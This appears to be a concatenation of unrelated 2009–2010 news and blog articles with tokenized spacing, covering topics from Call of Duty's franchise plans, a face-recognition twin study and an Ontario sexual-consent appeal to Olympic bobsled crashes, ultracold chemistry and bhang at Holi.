Water cutbacks mean most parks will be dead , brown turf by July ; the flower and fertilizer budget is zero .
City recreation centers , indoor and outdoor pools , and a handful of museums will close for good March 31 unless they find private funding to stay open .
Buses no longer run on evenings and weekends .
The city wo n’t pay for any street paving , relying instead on a regional authority that can meet only about 10 percent of the need .
“ I guess we ’re going to find out what the tolerance level is for people , ” said businessman Chuck Fowler .
Get ready to see a lot more Call of Duty video games in the future .
Activision 's announcement of a business unit devoted to the military first - person shooter suggests the publisher 's desire to extend the franchise 's reach as a video game brand name , industry experts say .
" Activision ( is ) aiming to position the Call of Duty universe as a malleable world in which multiple characters , plotlines and game types for various platforms can simultaneously co-exist , " says Scott Steinberg , a technology analyst and author of the book Get Rich Playing Games .
Call of Duty has become one of Activision 's signature franchises , alongside music series Guitar Hero and Blizzard 's massively multiplayer online game World of Warcraft .
To date , the series has generated $ 3 billion in revenue .
And expect the publisher to turn to Guitar Hero for inspiration on the Call of Duty business model .
" For years , we 've all been talking about video games and using movies as an entertainment industry comparison , " says John Davison , executive vice president of content at Game Pro magazine .
" But the more we see these " annualized " announcements , the more it 's clear that TV seasons are a much more appropriate comparison ; yearly blocks of content that are churned out until the audience grows tired of them . "
The news arrives with the franchise at its peak .
Call of Duty : Modern Warfare 2 , which released last November , has been a monster hit for Activision .
During the final two months of 2009 , the game sold nearly 12 million copies worldwide .
" Bringing Call of Duty to a wider audience , while still capitalizing on the popularity from the core audience is a great strategy in the short - term , " says Jesse Divnich , a video game analyst with Electronic Entertainment Design and Research .
FORUM : Share your thoughts on future of franchise
What long - term implications this arrangement will spawn remains unclear .
" The next three iterations of Call of Duty will bring in blockbuster sales … but I do n't see much in the future of Call of Duty past 2012 if they annualize the series , " says Divnich .
" At that point , we are looking at nearly 6 blockbuster releases in a row , and if future Call of Duty releases do not significantly innovate within their respected genre … brand fatigue could set in . "
In addition to a Treyarch - developed Call of Duty slated for release later this year , the publisher will release a 2011 " action adventure " title from internal studio Sledgehammer Games , led by the producers of Electronic Arts horror title Dead Space .
There are also plans to bring the franchise to Asia .
Flagship releases of Call of Duty had been developed exclusively by Infinity Ward until 2006 , when studio Treyarch took the helm of Call of Duty 3 .
Since then , both studios have alternated development cycles of the main series in order to annualize the franchise .
In its announcement , Activision also revealed Infinity Ward 's top two executives , president Jason West and CEO Vince Zampella , are no longer with the studio .
The publisher has not commented on why the two departed .
LAWSUIT : Former execs sue Activision for breach of contract
" It remains unclear whether Infinity Ward will remain involved with future installments , but an internal Activision memo sent to employees alongside the news indicated Activision would like them to remain a leader , " says G4's Patrick Klepek , credited with breaking the story about the studio changes .
" Moving the Call of Duty franchise outside of the shooter category could prove an interesting shakeup for the franchise , especially if they 're able to rotate between genres every year .
I 'm not convinced the franchise could sustain more than one release per year over the long - term . "
Regardless of Infinity Ward 's role with Call of Duty beyond Modern Warfare 2 , losing its leaders will sting .
" Clearly , it 's a blow to the franchise to have two of the brand 's creators no longer with the project , says Wedbush Morgan Securities analyst Michael Pachter .
" These guys founded the studio , worked on Medal of Honor before , and clearly have skills . "
Todd Greenwald , an analyst with Signal Hill Capital Group , expects Activision will handle the departure of West and Zampella better than EA did when the duo departed the Medal of Honor franchise , which " faded into oblivion , " he said .
The former Infinity Ward co-founders " certainly have the potential to do a number of exciting things -- either start up a new studio on their own and partner with a publisher or sign an employment contract with any of the large publishers out there ( EA , Ubisoft , Microsoft , Sony ) .
One way or another , it 's likely that they will attempt to start recruiting additional developers from Infinity Ward , and get to work on a competitor to Call of Duty / Modern Warfare . "
Adds Davison : " It remains to be seen whether the departure of Zampella and West will lead to further departures .
...
If Modern Warfare is the Halo product that all others benefit from -- and if the leadership of that product is gone -- how long can you sustain the franchise ? "

Scientists at the University College of London , Harvard University , and elsewhere have discovered that not only is the part of your brain responsible for recognizing faces different than the part that recognizes words or art , it is highly effected by your genes .
Dr. Brad Duchaine ( UCL ) and colleagues studied nearly 300 twins ( identical and fraternal ) by giving them a series of recognition tests .
On the Cambridge Face Memory Test ( CFMT ) , identical twins had scores that correlated very well – 0.7 , while non-identical twins had a much lower correlation – 0.29 .
Similar tests for word and abstract art recognition did not show such high correlations .
According to their paper published in PNAS , researchers think facial recognition is an unusual phenomenon , a “ highly specific cognitive ability that is highly heritable . ”
This research could lead to a search for those facial recognition genes , possibly in pursuit of a treatment for prosopagnosia and related conditions .
Just as importantly , it sheds light on how our genes shape our brain mechanisms , and how we might be able to alter / improve those mechanisms through genetic manipulation .
The quest for augmenting human intelligence is a fierce one .
Our modern civilization is based on years of school attendance – nominally in pursuit of making smarter workers and citizens .
It goes beyond that , however : we do n’t just want to get smarter through hard work , we want an easy fix .
Students regularly use nootropic drugs , herbal supplements are toted as keeping your mind young , and we continually report on studies that hope to find which vitamins and minerals are essential to brain health .
Yet the 21st century approach to making smarter humans is probably going to be genetic in nature .
We ’ve seen how a single manipulated gene can improve memory and cognition in rats .
Now , the CFMT twin study suggests that genes are also responsible for one of our most basic social skills : recognizing faces .
Politicians and business executives everywhere would line up around the block if a genetic therapy could be developed to augment facial recognition skills .
There ’s no sign that such a therapy would be possible yet , but this research suggests that the performance of at least one brain mechanism ( possibly many more ) is determined by our genes .
Which parent does n’t want a smarter child ?
Chalk this up as another pressure on society to begin producing designer babies .
It ’s pretty rare for us bloggers to be able to participate in the scientific research we report on .
Luckily , the CFMT is available to take online .
It only asks for a minimum of identifiable information , and takes 5 - 10 minutes to complete .
All you do is study some computer generated faces ( like those seen above ) and then recognize them in a line up .
Pretty simple , and kind of fun .
The test is available via Faceblind .org – part of a research partnership between Harvard and UCL interested in prosopagnosia .
I have n’t been able to find online versions of the word recognition and art recognition tests given to the twins ( and 1500 + non -twin volunteers ) .
The PNAS paper does show a typical question for each however :
It will be interesting to see if this research spawns a dedicated search for the genes responsible for improved ( or impaired ) facial recognition .
Certainly growing databases of genetic samples , and the ever decreasing costs of whole genome sequencing makes that search a reasonable possibility .
As we find other heritable cognitive abilities , similar work can be performed .
Exhaustive studies of our genes may lead to a better understanding of the ‘ genotype of cognition ’ .
Speaking of studies , why do n’t we see how Singularity Hub readers stack up on the facial recognition scale ?
Take the Cambridge Face Memory Test and post your scores in the comments section .
We can get a leader board started .
May the best genes win !

( CNN ) --
Four teenagers have been arrested for their alleged involvement at a party last month that caused at least $ 45,000 worth in damages to a house , according to police in East Bridgewater , Massachusetts .
" There was blood , urine , food , all over the floors , " Detective Michael Jenkins of the East Bridgewater Police said on Thursday .
" I 've never seen anything like it in my career . "
It was " total destruction , " he said .
He said a couple left for Paris , France , in late February , and left their 18 - year - old son with neighbors and a key to the house to keep an eye on it .
The son , who was unnamed , arrived at his house with some friends around 5 p.m. on February 20 and discovered a teenager , whom Jenkins identified only as a juvenile , playing basketball there .
The juvenile encouraged the son to have a party , Jenkins said , prompting the son to invite an unknown number of people over .
Four cars full of people also arrived after they were invited by the juvenile , the detective said .
But the party 's size burgeoned to 50 to 100 people after the juvenile logged onto Facebook and advertised the party , the detective said .
Some of the teenagers " trashed " the house , kicking down bathroom doors , ruining antique furniture and urinating on mattresses , Jenkins said .
The family 's truck , which was in the driveway , was ruined , Jenkins said .
A laptop was also stolen , he said .
Although the party occurred on February 20 , a Saturday , the damage was not reported until two days later , Jenkins said .
" The stench was unbearable , " he said .
The four teenagers were charged on Tuesday .
Three of them , who are charged as adults , were identified by police as Daniel Peterson , 18 ; Michael Edwards , 17 , and Gersham Grossman , 18 .
The fourth is a juvenile .
Peterson and Edwards face felony charges of malicious destruction .
Grossman faces a misdemeanor charge of unauthorized use of a motor vehicle and a felony charge of malicious destruction to a motor vehicle , Jenkins said .
It was not immediately clear if they had retained legal counsel .
The juvenile faces several charges , including malicious destruction and larceny , Jenkins said .
He said it had taken four to five weeks to complete the investigation , and he did not rule out additional arrests .
" We feel there were more kids that were involved in the destruction , " he said .
East Bridgewater , which has about 14,000 residents , is about 28 miles south of Boston .

I write about translations on Ted.com quite a bit and their use in language learning , but thought it might be easiest to explain through a video showing exactly how the process works .
This method works best for those that are in the intermediate stage , the looooong stage that takes place after mastering basic grammar but before functional fluency .
This is the stage where boredom is most likely to take place , and I find this method to be a good way to keep the interest up as it's doing two things at once - learning about the subject the speaker has been invited to TED to give a talk on , and the language you are studying as well .
Some languages on TED have hundreds of translations with upwards of 50 new translations every month , so for those languages even if you could finish one video a day you still would n't be able to cover them all .
The method uses Google Translate so it will work with most of the languages there ( Google has 52 languages available for translation while TED has translations for 70 ) .
And what if you 're learning Japanese or Chinese ?
If you 're learning Japanese , try copying the content of the speech and then paste it to a blog , Wikipedia user page or other site of yours .
Then use this to put the furigana on top ( edit : a helpful comment below also suggests a Firefox add - on called Rikaichan that only requires a mouseover ) .
For Chinese , use this page to convert it to Pinyin and then type that out to get the translation .

A British company believes it has come up with a revolutionary seat upgrade for racetrack riders .
The Chicane saddle unit ditches the traditional foam butt - pad for a series of rollers and gears to allow riders to slide smoothly from knee - down left to knee - down right in a tight series of corners without having to lift their entire bodyweight off the seat to do so .
It 's a fascinating idea , particularly for those of us that find track riding physically demanding on the legs - and the inventors believe it could help dampen the bowel - loosening sideways flick of a highside as well .
Motorcycle seats : they probably get less attention than any other part of a bike - at least from the manufacturer .
That 's why Corbin does such a great trade in aftermarket ones that are actually comfortable over the long distance .
But long - distance comfort is just one thing a rider might need from a seat .
What about racetrack riders ?
What are their posterior priorities ?
Well , most racers run a very thin foam pad - comfort 's clearly not the main focus .
And that 's because during high performance track riding , you 're pretty much constantly shifting your weight around the bike .
Body position and weight balance are of such crucial importance that you spend the majority of a track lap up on your toes on the pegs , with your butt hovering above the seat so you can smoothly transition from side to side .
This kind of thing takes some pretty well - conditioned quad and calf muscles over the course of a long race or track session - and it's one of the reasons why superbike and GP racing are such physically demanding pastimes .
One or two 20 - minute track sessions is enough for your average unfit rider ( not naming any names here ) to feel the burn - and even riders in better physical condition will tire and lose performance over the course of a long race .
It 's primarily this issue that Brit Brothers seeks to address with its new Chicane racing seat .
The Chicane seat does away with the foam pad in favor of a series of rollers covered by a rubber track .
Effectively , the seat is able to roll sideways to let the rider move around and hang off each side of the bike without having to lift his ( or her ) full weight off the seat to do so .
The chicane seat and tail unit
The benefits , according to the makers , are that you can conserve energy over the course of a track session , plus that since you 're not lifting your body up off the seat during changes of direction , you 're able to stay lower on the bike and out of the airstream more , so the aerodynamics are optimized .
A third benefit is that if the rear tyre spins up and goes sideways , and then grabs for a highside flick , the movable seat can help absorb some of that sideways energy and potentially help keep the rider on the bike .
I 'm not so sure about the second and third points - for starters , you tend to keep your head and shoulders fairly level when you move your butt about , plus , when you set your body position for a corner it 's usually during or after a heavy braking period where you 're using your body to catch as much wind as possible - so any aerodynamic benefits are likely to be negligible .
And the highside point sounds fairly speculative to me .
Then there 's the issue of mass distribution on the bike , and whether keeping the rider 's weight balanced low on the pegs might make for better handling dynamics than leaving it higher up on the seat - but I 'll leave that one for the physicists to argue over .
The chicane seat and tail unit , fitted to a Ducati
But just the thought of a seat unit that helps take physical pressure off the rider over the course of a track session - that makes a lot of sense to me .
In my physical condition ( to coin a phrase , I have curves in places that other people do n't have places )
I find the average track day ( six 20 - minute sessions ) quite physically demanding , to the point where lap times and concentration fall off towards the end of the day .
Something like this could help a lot of riders enjoy their high - performance riding a lot longer .
The Chicane saddle system is adjustable for friction and the strength of recoil back towards the centrepoint .
It 's not yet in production , but when it does hit the market it will likely be either as a simple seat swap for a variety of different sportsbikes , or as a track bike kit including a rear cowl / subframe .
Neat idea , we 'd like to give one a try .

MSNBC ’s Rachel Maddow is furious about knee - jerk Republican opposition to anything the Obama administration proposes , but she is equally frustrated by “ the futility of Democrats … trying to persuade Republicans to go along with them on policies that are good for the country . ”
Maddow summed up the current Republican position as one of “ Screw policy .
Screw what even they believe is good for the country .
Screw what even they believe is good for their own districts . ”
ADVERTISEMENT
“ They are not voting ‘ Yes ’ for even things that they agree with , ” Maddow explained .
Her primary example of Republican hypocrisy was the Obama administration ’s economic stimulus program , which “ passed despite every single Republican in the House voting ‘ No ’ on it . ”
“ Since then , the consensus among economists is that the stimulus has worked , ” Maddow commented .
But “ if there ’s one thing Republicans agree on now , it ’s that the stimulus is a bad , bad policy .
It ’s a bad idea that does bad things .
It ’s a bad president ’s bad way of making a bad economy more bad — because he ’s bad . ”
Maddow pointed out , however , that “ the same Republicans who have trashed the stimulus as a bad , bad thing ” have also been showing up “ in their home districts taking credit for all the good things the stimulus has done . ”
She noted in particular that Louisiana Governor Bobby Jindal “ has railed against the stimulus and then gone around the state handing out big fake checks with his own name on them , as if the money came from him . ”
Even Eric Cantor , who coordinated Republican opposition to the stimulus in the House , “ held a job fair in his home district at which nearly half the companies who were at the job fair , because they were in a position to hire , have received stimulus funds . ”
ADVERTISEMENT
Maddow ran through literally dozens of similar examples .
finally pausing to ask , “ Shall I go on ?
I could .
I could keep going till the top of the hour and beyond .
But you get the idea , right ? ”
“ None of this is a secret , ” Maddow emphasized , “ which is the most important things to understand about it .
Republicans right now do not care about policy .
By which I mean they will not vote for things that even they admit are good policies . ”
“ They are not embarrassed , ” Maddow concluded .
“ Charging them with hypocrisy , appealing to their better , more practical , more what ’s - best - for - the - country patriotic angels is like trying to teach your dog to drive .
It wastes a lot of time , it wo n’t work , and ultimately the dog comes out of the exercise less embarrassed for failing than you do for trying . ”

“ Grow up Democrats , ” Maddow advised soberly .
“ Face the music .
Do it alone .
You ’re the majority .
Kill the filibuster if they wo n’t let you use that majority .
The country needs you to . ”

In late 2009 , Anthony forecast that Arctic sea ice would continue to recover in 2010 .
Last month Steve Goddard did an analysis explaining why that was likely to happen and yesterday NSIDC confirmed the analysis .
The pattern of winds associated with a strongly negative AO tends to reduce export of ice out of the Arctic through the Fram Strait .
This helps keep more of the older , thicker ice within the Arctic .
While little old ice remains , sequestering what is left may help keep the September extent from dropping as low as it did in the last few years .
The wording of NSIDC press releases usually highlight the negative ( this one being no exception ) but the message is clear .
This summer is likely to continue the trend since 2007 of increasing summer minimums .
So how is Arctic sea ice looking at this point , near the winter maximum ?
NSIDC shows ice extent within 1 million km2 of normal and increasing .
http://nsidc.org/data/seaice_index/images/daily_images/N_timeseries.png
The Baltic and Bering Sea have slightly above normal ice .
Eastern Canada and The Sea of Okhotsk have slightly below normal ice .
http://nsidc.org/data/seaice_index/images/daily_images/N_daily_extent.png
DMI shows sea ice extent at nearly the highest in their six year record .
Sea ice extent for the past 5 years ( in million km2 ) for the northern hemisphere , as a function of date .
http://ocean.dmi.dk/arctic/icecover.uk.php
NORSEX shows ice area just outside one standard deviation ( i.e. almost normal . )
http://arctic-roos.org/observations/satellite-data/sea-ice/observation_images/ssmi1_ice_area.png
There ’s also some interesting comparisons to be made at Cryosphere Today .
When you compare the current images in recent days with the same period in years past , you notice how “ solid ” the ice has become .
For example compare March 3rd 2010 to March 3rd 2008 , when we saw the first year of recovery :
Note that there ’s no “ fuzziness ” in the signal return that creates this image on the right .
A fuzzy return would indicate less than solid ice , such as we see on the left .
The CT image from March 3rd is “ deep purple ” through and through .
The edges of the ice are very sharp also , particularly near Greenland and also in the Bering sea .
These two visual cues imply a solid , and perhaps thicker ice pack , rather than one that has been described by Dr. Barber as “ rotten ice ” .
I wish I could compare to March 3 2009 , but the CT images were offline last spring then while both they and NSIDC dealt with issues of SSMI sensor dropout that was originally brought to their attention by WUWT , but was deemed “ not worth blogging about “ .
According to JAXA , 2003 was a good year for Arctic sea ice .
Note the blue line .
So how does that year on March 3rd compare to our current year using CT ’s imagery ?
Compared to the best year for Arctic sea ice in the past decade , March 3rd this year looks quite solid .
The setup for 2010 having more ice looks good .
You can do your own side by side comparisons here with CT ’s interactive Arctic sea ice comparator .
The Arctic continues to recover , and one of the last CAGW talking points continues to look weaker and weaker .
It was n’t very long ago when experts were forecasting the demise of Arctic ice somewhere between 2008 and 2013 .
And it is not the first time that experts have done this – they were claiming the same nonsense in 1969 , right before the ice age scare .
Note the column at the right .
Even back then , skeptics got the short shrift on headlines because as we know : “ all is well , do n’t panic ” does n’t sell newspapers .
UPDATE : And then there ’s this :
AROUND 50 ships , including large ferries reportedly carrying thousands , were stuck in the ice in the Baltic Sea today and many were not likely to be freed for hours , Swedish maritime authorities said .

Obama had quite a whirlwind day Thursday – he signed the Nobel guest book , huddled with Prime Minister Jens Stoltenberg , met with King Harald V and Queen Sonja , and delivered an acceptance speech after he was formally presented with the prize .
He also joined the king and queen at an evening banquet .
But he skipped out on several other activities , including lunch with the king , a news conference at Oslo ’s Grand Hotel , CNN ’s traditional interview with the prize winner and a “ Save the Children ” benefit concert , where organizers replaced him with an Obama cardboard cutout .
Obama also wo n’t be around for Friday ’s Nobel Concert .
Presumably this means they stuck a cardboard cutout next to the entrance , but I ’ve been cracking myself up imagining that they put it in a seat in the front row or in the presidential box or something just to be extra spiteful .
Picture yourself onstage , fiddling away at the violin , and you look out and see a life - size version of this staring back at you .
I ’d kill for pics or video , but ca n’t find any .
If you see one , do n’t be shy .
In lieu of that , here ’s Krauthammer more or less echoing my take on his speech :
It could have been better , but it also could have been much , much worse .
Update :
Not quite as good as the presidential box but still pretty funny .

Their safe words were “ Tweety Bird , ” meant to indicate their admittedly kinky sexual behaviour should stop .
And they are what the common law wife of a man known as “ J.A. ” said she uttered sometime after waking from unconsciousness and finding herself being sodomized by her partner , who was later convicted of sexual assault and breach of probation .
On Friday , the Ontario Court of Appeal overturned those convictions in a 2 - 1 decision that left judges divided over the issue of whether a person can consent in advance to sexual activity that is expected to occur while unconscious .
In a dissenting opinion , Justice Harry LaForme said Parliament , through “ no means no ” provisions in the Criminal Code and other legislation , has expressed “ its clear view ” that advance consent to sexual activity under those circumstances is impossible and any consent by J.A. ’s spouse “ was negated when she was choked into unconsciousness . ”
But Justice Janet Simmons , writing for the appeal court majority , said permitting a person to consent in advance to sexual activity expected to occur while unconscious or asleep is entirely consistent with the principles of human dignity and autonomy .
“ Where a person consents in advance to sexual activity expected to occur while unconscious and does not change their mind , I fail to see how the Crown can prove lack of consent , ” Simmons said , with Justice Russell Juriansz agreeing .
J.A. ’s spouse , whose identity is protected by a court order , said she and her partner were into sado - masochistic activity that included bondage and had attempted “ erotic asphyxiation ” in the past as a means of heightening sexual excitement .
She also said they had discussed the possibility of anal intercourse as a way of “ spicing up ” their five - year relationship , although what happened that night in May of 2007 , when she awoke to find herself on “ all fours ” and being penetrated with a penis - shaped device , was “ quite spontaneous . ”
At J.A. ’s trial in 2008 , the defence reminded the court of former prime minister Pierre Trudeau ’s famous declaration that the state has no place in the bedrooms of the nation .
The Crown argued that for consent to sexual contact to be legally valid , a person must be consenting at the time the sexual activity occurs .
The Crown ’s position was accepted by Justice Dianne Nicholas of the Ontario Court of Justice , who said that under the circumstances , the binding of the complainant ’s hands and her sodomization by J.A. was “ dehumanizing ” and degrading .
But in Friday ’s decision , Simmons said there is no sense in the Crown ’s argument that consent to sexual activity must be given contemporaneously .
A competent person , for example , can consent to surgery which is to occur while unconscious and not in a position to withdraw consent once anaesthetized .
As for J.A. ’s spouse , she changed her story after she took the witness stand .
She originally went to police and gave a videotaped statement complaining he had assaulted her without her consent while she was unconscious .
In court later , she said she had consented to the acts and that she went to police because she was angry with J.A. because she believed he was going to leave her and seek custody of their 2 - year - old son .
Madrid , Spain ( CNN ) --
A man who used to teach at a Roman Catholic religious order 's schools in Spain has been arrested in Chile on suspicion of sexually abusing children , police in Spain and Chile said Tuesday .
The suspect , Jose Angel Arregui Erana , was arrested in August 2009 in Chile , where he was teaching .
He was held on suspicion of filming the abuse and possessing images of sexually abused boys , Jaime Jara , a Chilean cybercrime unit police commander , told CNN partner station CNN + by telephone Tuesday .
Jara said that the suspected crime of possessing the illegal images occurred in Chile but that the alleged sexual abuse of the students and the filming of it apparently occurred in Spain .
Arregui , who is in his early 50s , was a physical education teacher in Spain and allegedly placed hidden cameras in gyms and bathrooms to film sexual abuse of the students , Jara told CNN + , a 24 - hour Spanish language news channel based in Madrid .
The allegations come against a backdrop of allegations of child abuse by priests in Ireland , Germany , Austria and the Netherlands in recent months .
The suspect in the Spanish case does not appear to have been a priest , but a layman teaching in schools run by a Catholic order .
" The alleged events happened here , in Spain , " a Spanish Civil Guard spokesman in Madrid told CNN .
The spokesman , who by custom is not identified , said that Civil Guard investigators have been working on the case in recent months and that there has been more than one complaint from an alleged victim .
But none of the alleged victims so far have been willing to go public about the events , which in some cases occurred years ago , the Civil Guard spokesman said .
The religious order for which Arregui worked in Spain reacted with surprise and indignation Tuesday .
But spokesmen for the San Viator congregation said neither they nor other members of the order were aware of the alleged abuse and had received no complaints .
Ignacio Pelaez , a spokesman for the San Viator congregation in Madrid , said , " It 's surprising and of concern .
They knew nothing about this .
If they knew about this situation , they would have raised the matter or taken all measures to avoid it . "
The suspect taught at various San Viator schools , including one in Madrid and another in the town of Basauri , in Spain 's northern Basque region .
" We are more than surprised .
We are upset , and we want this to be solved as soon as possible , " said Juan Antonio Elgoibar , principal of the San Jose School in Basauri .
" And we want it solved in the best way possible . "
The principal said his congregation has " given all the facilities and help needed to all the members of the investigation team . "
The Civil Guard spokesman said the small number of complaints from alleged victims had gone to police , not necessarily to church officials .
A woman who lives in Basauri told CNN + there on Tuesday , " This is outrageous .
...
So many times the Vatican says so many things ... but the reality is that they hardly talk about it and condemn it .
...
It is outrageous . "
The Spanish newspaper El Pais reported that Arregui worked at various San Viator order schools in Spain from 1979 through 2007 , and that in addition to physical education , he taught language .
He later moved to Chile to teach at the University of St. Thomas , in the capital city , Santiago , El Pais reported .
The case is under investigation in a Madrid court , El Pais reported .

Canned tomato soup and chocolate !?
Yep .
There is n't one cake in Rose 's Heavenly Cakes that does n't look incredibly delicious but when choosing recipes to share one in particular jumped out at me .
Before I read the title and recipe for this Chocolate Tomato Cake with Mystery Ganache I looked at the photo .
It was a gorgeous chocolate cake iced with a dark chocolate ganache and rimmed with Pirouette cookies dotted with red buttercream .
The cookies made the cake look like a tiny castle — it was really adorable .
But then I glanced over to the recipe .
" Canned tomato soup and chocolate ! ? "
This was a recipe that I had to try out for myself , since I figured that the results would be either be fantastic or kind of foul .
Rose Levy Beranbaum created this cake for Campbell 's soup and explains in the introduction to this recipe that the tomato soup adds both color and a zing to the cake .
She also claims that no one is ever able to guess what the mystery ingredient is when she brings this cake to a party .
I 'll admit that I was dubious when I started baking .
I tasted the tomato soup out of the can and while it brought to mind a crisp grilled cheese , there was no way I could see it pairing well with chocolate .
I was dying to see how the flavors would transform during baking and how tomato soup would work in a ganache .
After a full afternoon of baking and assembling the cake I was left with a picture - perfect cake and lots of worries as to how it would taste once I sliced it open .
My fears were assuaged with the first bite .
The texture was light and moist with a great crumb , and while I knew the tomato soup was there , if someone served me this cake I would have no clue .
There were vegetal back notes but they were similar to those that you would find in some very dark chocolates .
Aside for being a beautiful and tasty , this chocolate cake is the ideal dinner party bring along , imagine ending dinner with a game of guess the mystery ingredient .
Win Rose 's Heavenly Cakes
As always with our Cook the Book feature , we have five ( 5 ) copies of Rose 's Heavenly Cakes to give away this week .
A strong medal contender was among two Swiss athletes to withdraw Friday from Olympic bobsled events after scary crashes , on a day when an American bobsledder said the venue where a luger was killed last week could generate speeds that are too dangerous .
Swiss - 1 driver Beat Hefti , this season 's overall World Cup champion , pulled out of two - man because of a concussion in a crash Wednesday .
He has n't decided whether to race in the four - man , which starts next Friday .
Swiss driver Daniel Schmid , who was not a medal favorite and has had previous problems on the track , pulled out of the two - man and four - man bob for " safety reasons " after two practice crashes .

" It 's just so fast , " American women 's bobsledder Shauna Rohbock said , later adding , " I think they went a little overboard on this track . "
On Friday , Schmid 's sled overturned during training and his brakeman , Juerg Egger , was taken from the track in an ambulance , then flown to Vancouver for observation .
A team doctor said there were no serious injuries .
" He has a cervical spine injury , " Christian Schlegel , Switzerland 's bobsled doctor , said of Egger .
" He can walk , he has no motor function disruption . "
A statement said Schmid 's decision to drop out was made jointly between the Swiss team and bobsled officials .
At least 11 two - man bobsleds spilled sideways in the first two days of training earlier this week .
There was one crash during training Friday night when Esme Kamphuis of the Netherlands tipped over and slid through the final corners .
On Saturday , a Russian sled lost control just past the midway point of the course .
No injuries were reported .
Rohbock and many of the women 's bobsledders who will compete on the track next week got their first on - ice look at the facility during a supplemental training session Friday night .
The extra session was added by international officials earlier this week to help racers familiarize themselves with the demanding track .
The session was added after the death last Friday of Georgian luger Nodar Kumaritashvili , who was killed when he lost control of his sled in the final curve at the Whistler Sliding Center track and hit a steel pole .
In an interview with The Associated Press , Rohbock , the silver medalist at the 2006 Turin Games , said she has felt the track was too fast since testing out the course for the first time nearly two years ago .
It 's so quick , Rohbock said , that women 's sleds will " be breaking the men 's track record by race time .
It 's ridiculous . "
Rohbock said speeds in the final turns of the 16 - curve track were pushing the boundaries of what she thought she could handle .
" I wish everybody knew what we saw at the bottom , " Rohbock said .
" Your brain almost can't catch up with what your hands need to do .
I think at some point it 's going to exceed that and that 's when problems will happen . "

The curious things that happen at low temperatures keep on throwing up surprises .
Last week , scientists reported that molecules in an ultra-cold gas can chemically react at distances up to 100 times greater than they can at room temperature .
In experiments closer to room temperature , chemical reactions tend to slow down as the temperature decreases .
But scientists found that molecules at frigid temperatures just a few hundred billionths of a degree above absolute zero ( −273.15 °C or 0 kelvin ) can still exchange atoms , forging new chemical bonds in the process , thanks to weird quantum effects that extend their reach at low temperatures .
“ It ’s perfectly reasonable to expect that when you go to the ultra - cold regime there would be no chemistry to speak of , ” says Deborah Jin from the University of Colorado in Boulder , whose team reported the finding in Science ( DOI : 10.1126/science.1184121 ) .
“ This paper says no , there ’s a lot of chemistry going on . ”

New Scientist takes a look at the weird and wonderful realm of the ultra-cold .
Why is absolute zero ( 0 kelvin or − 273.15 °C ) an impossible goal ?
Practically , the work needed to remove heat from a gas increases the colder you get , and an infinite amount of work would be needed to cool something to absolute zero .
In quantum terms , you can blame Heisenberg ’s uncertainty principle , which says the more precisely we know a particle ’s speed , the less we know about its position , and vice versa .
If you know your atoms are inside your experiment , there must be some uncertainty in their momentum keeping them above absolute zero – unless your experiment is the size of the whole universe .
What is the coldest place in the solar system ?
The lowest temperature ever measured in the solar system was on the Moon .
Last year , NASA ’s Lunar Reconnaissance Orbiter measured temperatures as low as − 240 °C in permanently shadowed craters near the lunar south pole .
That ’s around 10 degrees colder than temperatures measured on Pluto so far .
Brrrrrrrrr .
What is the coldest natural object in the universe ?
The coldest known place in the universe is the Boomerang Nebula , 5,000 light years away from us in the constellation Centaurus .
Scientists reported in 1997 that gases blowing out from a central dying star have expanded and rapidly cooled to 1 kelvin , only one degree warmer than absolute zero .
Usually , gas clouds in space have been warmed to at least 2.7 kelvin by the cosmic microwave background , the relic radiation left over from the big bang .
But the Boomerang Nebula ’s expansion creates a kind of cosmic refrigerator , allowing the gases to maintain their unusual cool .
What is the coldest object in space ?
If you count artificial satellites , things get chillier still .
Some instruments on the European Space Agency ’s Planck space observatory , launched in May 2009 , are frozen down to 0.1 kelvin , to suppress microwave noise that would otherwise fog the satellite ’s vision .
The space environment , combined with mechanical and cryogenic refrigeration systems using hydrogen and helium , chill the coldest instruments to 0.1 kelvin in four sequential steps .
What is the lowest temperature ever achieved in the laboratory ?
The lowest temperature ever recorded was back here on Earth in a laboratory .
In September 2003 , scientists at the Massachusetts Institute of Technology announced that they ’d chilled a cloud of sodium atoms to a record - breaking 0.45 nanokelvin .
Earlier , scientists at the Helsinki University of Technology in Finland achieved a temperature of 0.1 nanokelvin in a piece of rhodium metal in 1999 .
However , this was the temperature for just one particular type of motion – a quantum property called nuclear spin – not the overall temperature for all possible motions .
What weird behaviour can gases display near absolute zero ?
In everyday solids , liquids and gases , heat or thermal energy arises from the motion of atoms and molecules as they zing around and bounce off each other .
But at very low temperatures , the odd rules of quantum mechanics reign .
Molecules do n’t collide in the conventional sense ; instead , their quantum mechanical waves stretch and overlap .
When they overlap like this , they sometimes form a so - called Bose - Einstein condensate , in which all the atoms act identically like a single “ super-atom ” .
The first pure Bose - Einstein condensate was created in Colorado in 1995 using a cloud of rubidium atoms cooled to less than 170 nanokelvin .
​ They ’re getting that old time religion in northern India , as the annual Holi festival , an extravagant Hindu spring celebration of colors , is observed with potent marijuana milk shakes .
The festival , celebrated in March each year ( the exact date depends on the lunar calendar ) , is an occasion during which men , women and children play wildly with water guns and colored powder , according to .
And the fact that “ bhang thandai , ” an almond - flavored milk shake blended with cannabis , is a prominent part of the celebration does n’t hurt the festive atmosphere one bit .
​ The marijuana milk shakes are widely served , from exclusive private gatherings to street parties .
On this particular day , using bhang is considered completely acceptable for all adults , youths to grandparents .
Cannabis is technically illegal in India , since the nation is a signatory to Harry Anslinger ’s 1961 Single Convention narcotics treaty .
But the substance has been a part of the country ’s cultural heritage for thousands of years , and a law that ’s been around less than half a century has n’t made much of an impact .
Bhang is sold for consumption through government licensed outlets .
According to popular legend , bhang drinks were offered to the gods and were particularly loved by Lord Shiva .
If that ’s a close enough connection for the revelers to get stoned , then it works for me , too .
Praise Shiva and pass the bhang , homies !
​ ” At places , the revelry becomes rowdy and violent , ” said Percy Fernandez , a New Delhi - based consultant .
“ Not just bhang , Holi is also associated with heightened guzzling of alcohol .
Marijuana is not legal in India , but the tradition of having bhang during Holi is that it has a religioius association . ”
“ I know of shops selling bhang served with thandai ( a combination of milk , almonds , and cardamom ) and sweets among other eatables , ” Fernandez said .
“ Cannabis is traditionally smoked with tobacco or eaten in the form of pakkoras or even sweets . ”
“ For me , Holi is all about being a kid again , shedding your inhibitions , getting colors all on you , generally having a good time , ” said Rahul Verghese , a Gurgaon - based entrepreneur .
​” In our little colony … we have a little celebration with food , drinks and bhang , ” Verghese said .
“ It tastes smooth , and does n’t hit you initially , but a little later you ’re knocked out . ”
The fun ’s not over on the day after the Holi festival .
